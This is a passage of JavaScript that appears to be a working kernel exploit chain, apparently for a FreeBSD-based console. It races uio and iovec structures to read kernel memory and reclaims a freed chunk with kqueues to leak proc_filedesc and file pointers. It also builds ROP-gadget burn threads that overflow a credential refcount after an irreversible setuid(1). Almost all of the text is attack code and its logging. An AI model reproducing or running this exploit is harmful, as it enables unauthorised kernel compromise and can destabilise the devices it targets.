      await readReleaseByte("kreadB-drain-r");
    }
    out.loopB = itB;
    if (!found) {
      const segSeen = [...(out.segSeen || new Map()).entries()]
        .sort((x, y) => y[1].n - x[1].n)
        .map(([k, v]) => k + " x" + v.n + " (first@" + v.firstRound + ")");

      queueEvent(
        "KREADB-EXHAUSTED",
        "rounds=" +
          itB +
          "-loopA=" +
          out.loopA +
          "-distinct=" +
          (out.segSeen ? out.segSeen.size : 0) +
          "-top=" +
          (segSeen[0] || "none"),
      );
      out.why =
        "loop B exhausted " +
        itB +
        " rounds, forged iovec " +
        "array never landed; " +
        "first: " +
        (segSeen.length ? segSeen.join("; ") : "none, " + "no copyout") +
        "; iov_count=" +
        PK.UIO_IOV_COUNT;
      forceSettled(S.iovGroup, "kreadB-exhausted");
      await releaseIovAndSettle("kreadB-exhausted");

      await releaseUioAndSettle("kreadB-exhausted", size);
      return out;
    }

    await runBuilt("kread-tail-read", () => {
      armRet(1 + PK.UIO_THREAD_NUM);
      emit(PSYS.READ, retPtr(0), S.uioSockA, b.scratchBig.base, size);
      for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
        emit(PSYS.READ, retPtr(1 + i), S.uioSockA, b.kreadResult[i].base, size);
    });

    const A = 0x41414141;
    for (let i = 0; i < PK.UIO_THREAD_NUM; ++i) {
      const v = r64(b.kreadResult[i].u8, 0);
      const isSentinel = v.low === A && v.hi === A;
      const isZeroBuf = isZero64(v);
      if (!isSentinel && !isZeroBuf) out.hits.push({ i, v });
      else if (isZeroBuf)
        queueEvent(
          "KREAD-ZERO-BUF",
          "worker=" + i + "-rejected-pre-zeroed-buffer-unchanged",
        );
    }
    if (out.hits.length > 1)
      note(
        "kread_slow: " +
          out.hits.length +
          " of " +
          PK.UIO_THREAD_NUM +
          " uio workers returned data (" +
          out.hits.map((h) => h.i).join(",") +
          "); values " +
          (out.hits.every(
            (h) => h.v.low === out.hits[0].v.low && h.v.hi === out.hits[0].v.hi,
          )
            ? "agree"
            : "disagree"),
      );

    const result = out.hits.length ? out.hits[0] : null;

    let t1 = { j: -1 };
    if (result) {
      t1 = await TW.findTriplet(TW.S.triplets[0], -1, {
        attempts: PK.FIND_TRIPLET_FAST,
        deadlineMs: o.repairDeadlineMs || 20000,
      });
      if (t1.j >= 0) TW.S.triplets[1] = t1.j;
    }

    await H.waitFinished(S.uioReadGroup, PK.WAIT_DEADLINE_MS, "kread-tail");
    await runBuilt("kread-tail-w", () => {
      armRet(1);
      emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
    });

    const closeIov = async () => {
      await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "kread-close");
      await readReleaseByte("kread-close-r");
    };

    if (!result) {
      out.why =
        "no uio worker returned data, every result buffer still " +
        "0x4141414141414141 or pre-zeroed";
      await closeIov();
      return out;
    }
    if (t1.j < 0) {
      out.why =
        "read ok, triplets[1] not re-found " +
        "(" +
        (t1.reason || "?") +
        "/" +
        (t1.why || "?") +
        ")";
      TW.S.triplets[1] = -1;
      await closeIov();
      return out;
    }

    let got2 = -1;
    const dl2 = Date.now() + (o.repairDeadlineMs || 20000);
    for (let z = 0; z < 5; ++z) {
      const r2 = await TW.findTriplet(TW.S.triplets[0], TW.S.triplets[1], {
        attempts: PK.FIND_TRIPLET_FAST,
        deadlineAt: dl2,
      });
      if (r2.j >= 0) {
        got2 = r2.j;
        break;
      }
      await yieldN(1);
      if (Date.now() > dl2) break;
    }
    TW.S.triplets[2] = got2;
    if (got2 < 0) {
      out.why = "read ok, triplets[2] not re-found";
      await closeIov();
      return out;
    }
    await closeIov();

    out.ok = true;
    out.buf = b.kreadResult[result.i];
    out.value = result.v;
    out.worker = result.i;
    S.kreadOk++;
    flushMark(
      "KREAD-OK",
      "kaddr=" +
        hx(kaddr) +
        "-val=" +
        hx(result.v) +
        "-worker=" +
        result.i +
        "-loopA=" +
        out.loopA +
        "-loopB=" +
        out.loopB +
        "-triplets=" +
        TW.S.triplets.join("."),
    );
    return out;
  }

  async function kslowRead(kaddr, accept, why, opts) {
    const wasRace = setRaceMode(true);
    try {
      return await kslowReadBody(kaddr, accept, why, opts);
    } finally {
      setRaceMode(wasRace);
    }
  }

  async function kslowReadBody(kaddr, accept, why, opts) {
    const o = opts || {};
    const tries = o.tries || PK.KSLOW_ATTEMPTS;
    const log = [];
    for (let attempt = 0; attempt < tries; ++attempt) {
      if (TW.tripletsValid()) {
        const r = await kreadSlow(kaddr, 8, o);
        if (r.ok) {
          const v = r.value;
          const verdict = accept(v);
          log.push(
            "try" +
              attempt +
              ": " +
              hx(v) +
              (verdict === true ? " accepted" : " rejected(" + verdict + ")"),
          );
          if (verdict === true)
            return {
              ok: true,
              value: v,
              attempts: attempt + 1,
              log,
              loopA: r.loopA,
              loopB: r.loopB,
            };
        } else {
          log.push("try" + attempt + ": kread_slow failed -- " + r.why);
        }
      } else {
        log.push("try" + attempt + ": triplets invalid");
      }
      const rep = await TW.repairTriplets({ deadlineMs: 20000 });
      log.push("  repair " + (rep.ok ? "ok" : "FAILED " + (rep.why || "")));
      await yieldN(1);
      if (!rep.ok) break;
    }
    flushMark("KSLOW-FAILED", why + "-kaddr=" + hx(kaddr) + "-tries=" + tries);
    return { ok: false, value: null, attempts: tries, log };
  }

  function acceptKernelPtr(v) {
    if (isZero64(v)) return "zero";
    if (!isKernelPtr(v)) return "not-canonical(" + hx(v) + ")";
    if (!isAligned8(v)) return "not-8-aligned";
    return true;
  }
  async function kslow64(kaddr, why, opts) {
    return await kslowRead(kaddr, acceptKernelPtr, why, opts);
  }

  async function stage1(opts) {
    const wasRace = setRaceMode(true);
    try {
      return await stage1Body(opts);
    } finally {
      setRaceMode(wasRace);
    }
  }
  async function stage2(opts) {
    const wasRace = setRaceMode(true);
    try {
      return await stage2Body(opts);
    } finally {
      setRaceMode(wasRace);
    }
  }

  async function stage1Body(opts) {
    const o = opts || {}, b = S.buf;
    const B = Math.max(1, Math.min(64, o.kqBatch || PK.KQ_BATCH));
    const rounds = Math.max(1, o.rounds || PK.KQ_ROUNDS);
    const deadlineAt = Date.now() + (o.deadlineMs || 90000);
    const out = {
      ok: false, why: "", hits: [], fdp: null, rounds: 0,
      kqOpened: 0, kqClosed: 0, sig64: false, outLens: [], batches: [],
      independent: false, confirmGaveUp: false, winnerOutLen: -1,
      sigSeen: new Map()
    };
    needStub(PSYS.KQUEUE, "stage 1 kqueue reclaim");
    if (!TW.tripletsValid()) {
      out.why = "triplets invalid";
      return out;
    }
    const CELL = 256;
    const cells = alloc(CELL * B, "kq-readback-cells-" + B + "x" + CELL);
    const lens = alloc(4 * B, "kq-optlen-cells-" + B);
    const cellPtr = (i) => cells.base.add32(i * CELL);
    const lenPtr = (i) => lens.base.add32(i * 4);

    flushMark(
      "STAGE1-FREE-T1",
      "free_rthdr(triplets[1]=" + TW.S.triplets[1] + ")"
    );
    await runBuilt("stage1-free-t1", () => {
      armRet(3);
      emitFreeRthdr(TW.S.triplets[1], 0);
      emit(PSYS.SCHED_YIELD, retPtr(1));
      emit(PSYS.SCHED_YIELD, retPtr(2));
    });
    let done = 0;
    const confirmBudget = Math.max(B,
      Math.min(rounds, o.confirmRounds || B * 64));
    let confirmStartedAt = -1;
    let batch = 0;
    while (done < rounds && Date.now() < deadlineAt) {
      const nb = Math.min(B, rounds - done);
      batch++;

      for (let i = 0; i < nb; ++i) {
        w32(lens.u8, i * 4, CELL);
        for (let z = 0; z < CELL; ++z) cells.u8[i * CELL + z] = 0;
      }
      armRet(2 * nb);
      await runBuilt("stage1-kq-batch", () => {
        for (let i = 0; i < nb; ++i) {
          emit(PSYS.KQUEUE, retPtr(2 * i));
          emitGetRthdr(TW.S.triplets[0], cellPtr(i), lenPtr(i), 2 * i + 1);
        }
      });
      done += nb;
      out.rounds = done;
      const kqByCell = new Array(nb).fill(-1);
      let openedCount = 0;
      for (let i = 0; i < nb; ++i) {
        const kq = retOf(2 * i);
        if (kq >= 0) {
          kqByCell[i] = kq;
          openedCount++;
          S.kqOpen.push(kq);
          track(kq);
        }
      }
      S.kqueuesOpened += openedCount;
      out.kqOpened += openedCount;
      let winner = -1;
      for (let i = 0; i < nb; ++i) {
        if (retOf(2 * i + 1) !== 0) continue;
        const outLen = r32(lens.u8, i * 4) >>> 0;
        if (out.outLens.length < 8) out.outLens.push(outLen);

        if (outLen < PK.KQ_MIN_OUTLEN) continue;
        const sig32 = r32(cells.u8, i * CELL + 8) >>> 0;
        if (sig32 !== PK.KQ_SIGNATURE) {
          const prev = out.sigSeen.get(sig32);
          if (prev) prev.n++;
          else if (out.sigSeen.size < 12)
            out.sigSeen.set(sig32, {
              n: 1,
              outLen,
              fdp: hx(r64(cells.u8, i * CELL + PK.OFF.KQ_FDP))
            });
          continue;
        }
        const sigHi = r32(cells.u8, i * CELL + 12) >>> 0;
        if (sigHi === 0) out.sig64 = true;
        const fdp = r64(cells.u8, i * CELL + PK.OFF.KQ_FDP);
        if (isZero64(fdp)) continue;
        out.hits.push({
          round: done - nb + i, batch, fdp, outLen, sig64: sigHi === 0
        });
        winner = i;
        break;
      }

      if (winner >= 0) {
        const h = out.hits[out.hits.length - 1];
        flushMark(
          "STAGE1-HIT",
          "batch=" + batch + "-round=" + h.round + "-outLen=" + h.outLen
            + "-sig32=0x" + PK.KQ_SIGNATURE.toString(16)
            + "-sig64held=" + out.sig64 + "-kq_fdp=" + hx(h.fdp)
            + "-hitsSoFar=" + out.hits.length
        );
      }
      const winFd = winner >= 0 ? kqByCell[winner] : -1;
      const nonWinners = kqByCell.filter((fd) => fd >= 0 && fd !== winFd);
      const dropKq = (fd) => {
        untrack(fd);
        const ix = S.kqOpen.indexOf(fd);
        if (ix >= 0) S.kqOpen.splice(ix, 1);
        S.kqueuesClosed++;
        out.kqClosed++;
      };
      if (nonWinners.length) {
        armRet(nonWinners.length);
        await runBuilt("stage1-kq-close", () => {
          for (let i = 0; i < nonWinners.length; ++i)
            emit(PSYS.CLOSE, retPtr(i), nonWinners[i]);
        });
        for (const fd of nonWinners) dropKq(fd);
      }
      if (winFd >= 0) {
        await runBuilt("stage1-kq-close-winner", () => {
          armRet(1);
          emit(PSYS.CLOSE, retPtr(0), winFd);
        });
        dropKq(winFd);
      }

      const batches = {};
      for (const h of out.hits) batches[h.batch] = 1;
      const distinct = Object.keys(batches).length;
      if (distinct >= 2) break;
      if (distinct >= 1 && o.confirm === false) break;
      if (distinct >= 1) {
        if (confirmStartedAt < 0) confirmStartedAt = done;
        if (done - confirmStartedAt >= confirmBudget) {
          out.confirmGaveUp = true;
          break;
        }
      }
      await yieldN(1);
    }
    if (!out.hits.length) {
      const seen = [...out.sigSeen.entries()]
        .sort((a, b) => b[1].n - a[1].n)
        .map(([s, v]) => "0x" + (s >>> 0).toString(16) + " x" + v.n
          + " (+0xA8=" + v.fdp + ", outLen=" + v.outLen + ")");
      flushMark(
        "STAGE1-NO-SIG",
        "distinct=" + out.sigSeen.size + "-expected=0x"
          + PK.KQ_SIGNATURE.toString(16) + "-top=" + (seen[0] || "none")
      );
      out.why = "no kqueue landed in the freed chunk in " + out.rounds
        + " rounds (outLen samples: " + out.outLens.join(",") + "). "
        + (out.sigSeen.size
        ? "no chunk read matched KQ_SIGNATURE 0x"
          + PK.KQ_SIGNATURE.toString(16) + "; at +0x08, "
          + "most frequent first: " + seen.join("; ") + ""
        : "nothing passed the copyout gate (outLen >= 0x"
          + PK.KQ_MIN_OUTLEN.toString(16) + ")")
        + " ERR_LEAK_KQUEUE (poops.c:55, :1478).";
      return out;
    }
    const first = out.hits[0].fdp;
    for (const h of out.hits) {
      if (h.fdp.low !== first.low || h.fdp.hi !== first.hi) {
        out.why = "two kqueue hits disagree about kq_fdp: " + hx(first)
          + " vs " + hx(h.fdp);
        return out;
      }
    }
    const v = acceptKernelPtr(first);
    if (v !== true) {
      out.why = "proc_filedesc " + hx(first) + " rejected: " + v;
      return out;
    }
    S.procFiledesc = first;
    out.fdp = first;
    const seenBatches = {};
    for (const h of out.hits) seenBatches[h.batch] = 1;
    out.batches = Object.keys(seenBatches).map(Number);
    out.independent = out.batches.length >= 2;
    out.winnerOutLen = out.hits[0].outLen;
    flushMark(
      "STAGE1-FDP",
      "proc_filedesc=" + hx(first) + "-hits=" + out.hits.length
        + "-batches=" + out.batches.join(".") + "-independent="
        + out.independent + "-confirmGaveUp=" + (out.confirmGaveUp ? 1 : 0)
    );
    const dl = Date.now() + (o.repairDeadlineMs || 60000);
    let got = -1;
    for (let z = 0; z < PK.STAGE1_REPAIR_TRIES; ++z) {
      const r = await TW.findTriplet(TW.S.triplets[0], TW.S.triplets[2], {
        attempts: PK.STAGE1_REPAIR_ATTEMPTS,
        deadlineAt: dl
      });
      if (r.j >= 0) {
        got = r.j;
        break;
      }
      await yieldN(1);
      await sleepK(10);
      if (Date.now() > dl) break;
    }
    TW.S.triplets[1] = got;
    if (got < 0 || !TW.tripletsValid()) {
      out.why = "stage1: triplet repair failed (triplets="
        + TW.S.triplets.join(",") + ")";
      return out;
    }
    out.ok = true;
    return out;
  }

  async function stage2Body(opts) {
    const o = opts || {};
    const out = { ok: false, why: "", steps: [], attempt: 0 };
    const attempts = Math.max(1, o.attempts || PK.STAGE2_ATTEMPTS);
    if (!S.procFiledesc) {
      out.why = "no proc_filedesc";
      return out;
    }
    const t0 = Date.now(), deadlineAt = t0 + (o.deadlineMs || 900000);
    out.deadlineMs = deadlineAt - t0;
    for (let a = 1; a <= attempts; ++a) {
      if (Date.now() > deadlineAt) {
        out.why = (out.why ? out.why + "; " : "") + "stage 2 wall clock "
          + Math.round((deadlineAt - t0) / 1000) + " s hit after "
          + (a - 1) + " attempt(s)";
        flushMark(
          "STAGE2-DEADLINE",
          "attempts=" + (a - 1) + "-ms=" + (Date.now() - t0)
        );
        break;
      }
      out.attempt = a;
      out.steps = [];
      const r = await stage2Once(o, out, deadlineAt);
      if (r) {
        out.ok = true;
        out.ms = Date.now() - t0;
        return out;
      }
      flushMark(
        "STAGE2-RETRY",
        "attempt=" + a + "-of-" + attempts + "-elapsedMs="
          + (Date.now() - t0) + "-remainingMs="
          + Math.max(0, deadlineAt - Date.now()) + "-why="
          + out.why.slice(0, 100)
      );
      const rep = await TW.repairTriplets({ deadlineMs: 20000 });
      if (!rep.ok) {
        out.why = (out.why ? out.why + "; " : "")
          + "triplet repair failed (" + (rep.why || "?")
          + "), no further attempt";
        break;
      }
      await sleepK(PK.STAGE2_SLEEP_MS);
    }
    return out;
  }

  async function stage2Once(o, out, deadlineAt) {
    const expired = () => deadlineAt !== undefined && Date.now() > deadlineAt;
    const step = async (label, kaddr) => {
      if (expired()) {
        out.steps.push(label + "=not attempted (stage-2 wall clock)");
        flushMark("STAGE2-DEADLINE", "before=" + label);
        return { ok: false, log: ["stage-2 wall clock expired"] };
      }
      flushMark("STAGE2-READ-PRE", label + "-kaddr=" + hx(kaddr));
      const r = await kslow64(kaddr, "stage2:" + label, {
        repairDeadlineMs: 20000,
        loopDeadlineMs: 30000
      });
      out.steps.push(label + "=" + (r.ok ? hx(r.value) : "FAILED")
        + " [" + r.log.join(" | ") + "]");
      flushMark("STAGE2-READ", label + "=" + (r.ok ? hx(r.value) : "FAILED"));
      return r;
    };
    await TW.repairTriplets({ deadlineMs: 20000 });
    await sleepK(PK.STAGE2_SLEEP_SHORT_MS);
    const a1 = await step("fdescenttbl",
      S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES));
    if (!a1.ok) {
      out.why = "fdescenttbl read failed";
      return false;
    }
    const fdescenttbl = a1.value;
    S.fdOfiles = fdescenttbl.add32(PK.OFF.FDESCENTTBL_HDR);
    const maxFd = Math.max(S.masterRfd, S.victimRfd);
    const nf = await kslowRead(
      fdescenttbl,
      (v) => {
        if (v.hi !== 0) return "high-dword-nonzero(" + hx(v) + ")";
        if (v.low === 0) return "zero";
        if (v.low > 0x100000) return "implausible(" + v.low + ")";
        return true;
      },
      "stage2:fdt_nfiles",
      { repairDeadlineMs: 20000 }
    );
    if (nf.ok) {
      S.nfiles = nf.value.low;
      out.steps.push("fdt_nfiles=" + S.nfiles);
      if (maxFd >= S.nfiles) {
        out.why = "fd " + maxFd + " outside fdt_nfiles=" + S.nfiles;
        return false;
      }
    } else {
      note("fdt_nfiles read failed (" + nf.log.join(" | ") + ")");
    }
    await TW.repairTriplets({ deadlineMs: 20000 });
    await sleepK(PK.STAGE2_SLEEP_MS);
    await TW.repairTriplets({ deadlineMs: 20000 });
    const a2 = await step("master_fp",
      S.fdOfiles.add32(S.masterRfd * PK.OFF.FILEDESCENT_SIZE));
    if (!a2.ok) {
      out.why = "master_fp read failed";
      return false;
    }
    S.masterFp = a2.value;
    await TW.repairTriplets({ deadlineMs: 20000 });
    await sleepK(PK.STAGE2_SLEEP_MS);
    await TW.repairTriplets({ deadlineMs: 20000 });
    const a3 = await step("victim_fp",
      S.fdOfiles.add32(S.victimRfd * PK.OFF.FILEDESCENT_SIZE));
    if (!a3.ok) {
      out.why = "victim_fp read failed";
      return false;
    }
    S.victimFp = a3.value;
    if (S.masterFp.low === S.victimFp.low && S.masterFp.hi === S.victimFp.hi) {
      out.why = "master_fp === victim_fp (" + hx(S.masterFp)
        + "), filedescent size 0x" + PK.OFF.FILEDESCENT_SIZE.toString(16)
        + " or fd_ofiles wrong for the active firmware profile";
      return false;
    }
    await TW.repairTriplets({ deadlineMs: 20000 });
    await sleepK(PK.STAGE2_SLEEP_MS);
    await TW.repairTriplets({ deadlineMs: 20000 });
    const a4 = await step("master_pipe_data",
      S.masterFp.add32(PK.OFF.FILE_F_DATA));
    if (!a4.ok) {
      out.why = "master_pipe_data read failed";
      return false;
    }
    S.masterPipeData = a4.value;
    await TW.repairTriplets({ deadlineMs: 20000 });
    await sleepK(PK.STAGE2_SLEEP_MS);
    await TW.repairTriplets({ deadlineMs: 20000 });
    const a5 = await step("victim_pipe_data",
      S.victimFp.add32(PK.OFF.FILE_F_DATA));
    if (!a5.ok) {
      out.why = "victim_pipe_data read failed";
      return false;
    }
    S.victimPipeData = a5.value;
    if (S.masterPipeData.low === S.victimPipeData.low
      && S.masterPipeData.hi === S.victimPipeData.hi) {
      out.why = "master_pipe == victim_pipe (" + hx(S.masterPipeData)
        + ") -- aliased, bad leak";
      return false;
    }
    out.recheckOk = false;
    const a6 = await step("fdescenttbl-recheck",
      S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES));
    if (!a6.ok) {
      note("fdescenttbl re-read failed, single unrepeated read of the "
        + "fd table base");
    } else if (a6.value.low !== fdescenttbl.low
      || a6.value.hi !== fdescenttbl.hi) {
      out.why = "fdescenttbl changed between first and last read ("
        + hx(fdescenttbl) + " -> " + hx(a6.value) + ")";
      return false;
    } else {
      out.recheckOk = true;
    }
    return true;
  }

  function poc() {
    return i64(PK.POC_ARG_LO, PK.POC_ARG_HI);
  }

  function buildBurnWorker(sync, wid, core, rfd, dummyPtr, unroll) {
    needStub(PSYS.KQUEUEEX, "the cr_ref overflow burn");
    needStub(PSYS.READ, "the burn worker's pipe gate");
    H.needGadgets(H.G_BRANCH, "the burn worker's read() gate");
    const t = H.newThread("burn" + wid, 0x40000, 0x400);
    t.jbWid = wid;
    const bufs = H.emitPrologue(t, sync, wid, core, TK.POOPS_RTPRIO);
    const loopStart = t.get_rsp();

    t.self_healing_syscall(PSYS.READ, rfd, dummyPtr, 1);
    t.write_result4(sync.ptr("waitret", wid));

    const gate = t.create_branch(
      t.branch_types.EQUAL,
      sync.ptr("waitret", wid),
      1,
    );
    const gateMet = t.get_rsp();

    const pivotGadget = P.gadgets["pop rsp"];
    if (pivotGadget === undefined)
      throw new Error(
        "gadget 'pop rsp' missing, no burn worker " + "kill switch",
      );
    t.push(pivotGadget);
    const pivotIdx = t.count;
    t.push(0);
    const workStart = t.get_rsp();
    for (let i = 0; i < unroll; ++i)
      t.self_healing_syscall(PSYS.KQUEUEEX, poc());
    t.write_result4(sync.ptr("workret", wid));
    t.increment_dword(sync.ptr("finished", wid));
    t.jmp_to_rsp(loopStart);
    const exitTail = t.get_rsp();
    t.push_write8(sync.ptr("status", wid), TK.ST_EXITED);
    t.push_write8(sync.ptr("cpu", wid), PK.EXIT_MARK);
    t.fcall(P.syscalls[PSYS.THR_EXIT], 0);

    t.set_branch_points(gate, gateMet, exitTail);
    t.set_entry(pivotIdx, workStart);
    t.jbMarks = { loopStart, workStart, exitTail, pivotIdx, valIdx: -1, gate };
    t.jbBufs = bufs;
    t.jbBudget = H.assertSlots(t, "burn" + wid);
    t.jbSync = sync;
    return t;
  }

  async function pipeBurnPair(label) {
    needStub(
      PSYS.FCNTL,
      "burn pipe write end O_NONBLOCK, " + "read end blocking",
    );
    w32(S.buf.pipefd.u8, 0, 0);
    w32(S.buf.pipefd.u8, 4, 0);
    flushMark(
      "PIPE2-PRE",
      label +
        "-out=0x" +
        S.buf.pipefd.base.toString() +
        "-flags=0-BLOCKING-both-ends",
    );
    const r = await sys(PSYS.PIPE2, S.buf.pipefd.base, 0);
    if (r.failed) throw new Error("pipe2(" + label + ") failed: " + r.errText);
    const rfd = r32(S.buf.pipefd.u8, 0) | 0,
      wfd = r32(S.buf.pipefd.u8, 4) | 0;
    if (rfd < 0 || wfd < 0)
      throw new Error("pipe2(" + label + ") gave " + rfd + "," + wfd);
    track(rfd);
    track(wfd);
    const sf = await sys(PSYS.FCNTL, wfd, K.F_SETFL, K.O_NONBLOCK);
    const gw = await sys(PSYS.FCNTL, wfd, K.F_GETFL, 0);
    const gr = await sys(PSYS.FCNTL, rfd, K.F_GETFL, 0);
    const wNb = !gw.failed && (gw.s32 & K.O_NONBLOCK) !== 0;
    const rNb = !gr.failed && (gr.s32 & K.O_NONBLOCK) !== 0;
    flushMark(
      "PIPE2",
      label +
        "-r=" +
        rfd +
        "-w=" +
        wfd +
        "-setfl=" +
        sf.s32 +
        "-wNONBLOCK=" +
        (wNb ? 1 : 0) +
        "-rNONBLOCK=" +
        (rNb ? 1 : 0),
    );
    if (rNb)
      throw new Error(
        "burn pipe " +
          label +
          ": read end came back " +
          "O_NONBLOCK (F_GETFL=0x" +
          (gr.s32 >>> 0).toString(16) +
          ")",
      );
    return [rfd, wfd, wNb];
  }

  async function openFreeFdSource() {
    for (const path of PK.FREE_FD_PATHS) {
      let sp;
      try {
        sp = P.stringify(path);
      } catch (e) {
        continue;
      }
      const a = await sys(PSYS.OPEN, sp, K.O_RDONLY);
      if (a.failed || a.s32 < 0) continue;
      const b2 = await sys(PSYS.OPEN, sp, 0);
      await sys(PSYS.CLOSE, a.s32);
      if (b2.failed || b2.s32 < 0) continue;
      await sys(PSYS.CLOSE, b2.s32);
      S.freeFdPath = path;
      flushMark("FREE-FD-PATH", "path=" + path.replace(/\//g, "_"));
      return { kind: "open", ptr: sp, path };
    }

    S.freeFdPath = "socket(AF_INET6,SOCK_DGRAM)";
    flushMark("FREE-FD-PATH", "fallback=ipv6-dgram-socket");
    return { kind: "socket", ptr: 0, path: S.freeFdPath };
  }

  function newFreeFd(src, retIdx) {
    if (src.kind === "open")
      emit(PSYS.OPEN, retPtr(retIdx), src.ptr, K.O_RDONLY);
    else emit(PSYS.SOCKET, retPtr(retIdx), K.AF_INET6, K.SOCK_DGRAM, 0);
  }

  async function prepareFds(opts) {
    const o = opts || {};
    const mode = o.mode || "probe";
    S.burnMode = mode;
    const out = {
      ok: false,
      why: "",
      fdBudget: -1,
      freeFdsNum: -1,
      mode,
      kqueueexRet: null,
      fdDelta: 0,
      burnRounds: 0,
      burnSyscalls: 0,
      burnMs: 0,
      projectedMs: -1,
    };

    needStub(PSYS.GETRLIMIT, "prepare_fds raises the soft fd limit");
    needStub(PSYS.SETRLIMIT, "prepare_fds raises the soft fd limit");
    needStub(PSYS.OPEN, "the free-fd pool");

    const b = S.buf;
    for (let i = 0; i < 16; ++i) b.rlimit.u8[i] = 0;
    flushMark(
      "RLIMIT-PRE",
      "getrlimit(RLIMIT_NOFILE=8)-buf=0x" + b.rlimit.base.toString(),
    );
    const gr = await sys(PSYS.GETRLIMIT, 8, b.rlimit.base);
    const curLo = r32(b.rlimit.u8, 0),
      maxLo = r32(b.rlimit.u8, 8);
    if (!gr.failed) {
      w32(b.rlimit.u8, 0, maxLo);
      w32(b.rlimit.u8, 4, r32(b.rlimit.u8, 12));
      const sr = await sys(PSYS.SETRLIMIT, 8, b.rlimit.base);
      S.rlimitRaised = !sr.failed;
      flushMark(
        "RLIMIT",
        "cur=" + curLo + "-max=" + maxLo + "-setrlimit=" + sr.s32,
      );
    } else {
      flushMark("RLIMIT", "getrlimit-failed-" + gr.errText);
    }

    const src = await openFreeFdSource();

    const CH = 128;
    const probe = [];
    const cap = Math.max(
      64,
      Math.min(PK.LEAK_FD_MAX, o.fdMax || PK.LEAK_FD_MAX),
    );
    let stop = false;
    for (let base = 0; base < cap && !stop; base += CH) {
      const nb = Math.min(CH, cap - base);
      armRet(nb);
      await runBuilt("fd-probe", () => {
        for (let i = 0; i < nb; ++i) newFreeFd(src, i);
      });
      for (let i = 0; i < nb; ++i) {
        const fd = retOf(i);
        if (fd < 0) {
          stop = true;
          break;
        }
        probe.push(fd);
      }
    }
    S.fdBudget = out.fdBudget = probe.length;
    flushMark(
      "FD-BUDGET",
      "budget=" +
        probe.length +
        "-cap=" +
        cap +
        "-source=" +
        S.freeFdPath.replace(/\//g, "_"),
    );
    for (let base = 0; base < probe.length; base += CH) {
      const nb = Math.min(CH, probe.length - base);
      armRet(nb);
      await runBuilt("fd-probe-close", () => {
        for (let i = 0; i < nb; ++i)
          emit(PSYS.CLOSE, retPtr(i), probe[base + i]);
      });
    }

    let freeFdsNum = probe.length - PK.FD_BUDGET_MARGIN;
    if (freeFdsNum > PK.FREE_FDS_CAP) freeFdsNum = PK.FREE_FDS_CAP;
    out.freeFdsNum = freeFdsNum;
    const need = PK.R_ESTIMATE + 40;
    if (freeFdsNum < need) {
      out.why =
        "fd budget too small: free_fds_num=" +
        freeFdsNum +
        " must exceed R~" +
        PK.R_ESTIMATE +
        " with margin (need >= " +
        need +
        "); fd_budget=" +
        probe.length +
        ". F1: clean abort, " +
        "nothing freed";
      return out;
    }

    const walkNeed = 2 * PK.TRIPLEFREE_ATTEMPTS;
    if (freeFdsNum < walkNeed)
      note(
        "free_fds_num=" +
          freeFdsNum +
          " below 2 x " +
          PK.TRIPLEFREE_ATTEMPTS +
          " = " +
          walkNeed,
      );

    const before = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
    const fdBefore = before.failed ? -1 : before.s32;
    if (fdBefore >= 0) await sys(PSYS.CLOSE, fdBefore);
    flushMark(
      "KQUEUEEX-PRE",
      "syscall=0x08D-rdi=0x800000000000-n=1" + "-fdWatermark=" + fdBefore,
    );
    const kx = await sys(PSYS.KQUEUEEX, poc());
    out.kqueueexRet = kx.s32;
    flushMark("KQUEUEEX", "ret=" + kx.s32 + "-" + kx.errText);
    S.kqueueexIssued++;

    if (mode === "none") {
      out.ok = true;
      out.why =
        "stopped before setuid(1) and the burn, nothing " + "irreversible ran";
      return out;
    }

    const cores = pickBurnCores(o.core);
    const unroll = Math.max(
      1,
      Math.min(PK.LEAK_UNROLL, o.unroll || PK.LEAK_UNROLL),
    );
    const sync = H.newSync(RACER_FIELDS(PK.LEAK_CORES));
    const workers = [];
    const dummy = alloc(8, "burn-dummy-byte");

    const feed = alloc(4096, "burn-feed");
    let g = null;

    const LEAK_SYSCALLS = 0x100000001;
    const totalNeeded = LEAK_SYSCALLS - freeFdsNum;

    const plannedRounds =
      mode === "full"
        ? Math.floor(totalNeeded / unroll)
        : Math.max(PK.LEAK_CORES, o.probeRounds || 20);
    const tailCalls =
      mode === "full" ? totalNeeded - plannedRounds * unroll : 0;

    const baseShare = Math.floor(plannedRounds / PK.LEAK_CORES);
    const want = [];
    for (let i = 0; i < PK.LEAK_CORES; ++i)
      want.push(
        baseShare + (i === 0 ? plannedRounds - baseShare * PK.LEAK_CORES : 0),
      );
    S.burnPlan = {
      mode,
      unroll,
      freeFdsNum,
      totalNeeded,
      plannedRounds,
      tailCalls,
      want: want.slice(),
    };
    out.plannedRounds = plannedRounds;
    out.tailCalls = tailCalls;
    flushMark(
      "BURN-PLAN",
      "mode=" +
        mode +
        "-unroll=" +
        unroll +
        "-poolFds=" +
        freeFdsNum +
        "-rounds=" +
        plannedRounds +
        "-tail=" +
        tailCalls +
        "-want=" +
        want.join("."),
    );

    const queued = new Array(PK.LEAK_CORES).fill(0);
    let rounds = 0;
    const t0 = Date.now();

    try {
      for (let i = 0; i < PK.LEAK_CORES; ++i) {
        const [rfd, wfd] = await pipeBurnPair("burn" + i);
        S.burnPipes.push([rfd, wfd]);
        workers.push(
          buildBurnWorker(
            sync,
            i,
            cores[i % cores.length],
            rfd,
            dummy.base,
            unroll,
          ),
        );
      }
      g = H.newGroup("burn", workers, sync, {
        signalDeadline: PK.SIGNAL_DEADLINE_MS,
        exitDeadline: PK.EXIT_DEADLINE_MS,
      });
      g.jbFeed = feed;
      S.burnThreads.push(g);

      if (mode === "full") {
        await armLineA(
          "setuid(1) then burn " +
            "0x100000001 kqueueex refs to wrap cr_ref, setuid " +
            "irreversible until reboot",
        );
        await sys(PSYS.SETUID, 1);
        S.setuidCalls++;
        await sleepK(10000);
      }

      await H.spawnGroup(g);
      let readyFailed = "";
      for (const t of g.spawned) {
        const ms = await H.awaitStatus(
          sync,
          t.jbWid,
          TK.ST_READY,
          PK.READY_DEADLINE_MS,
          "burn-ready",
        );
        if (ms < 0) {
          readyFailed = "burn worker " + t.jbWid + " never reached READY";
          break;
        }
      }
      if (readyFailed) {
        out.why = readyFailed;
        return out;
      }
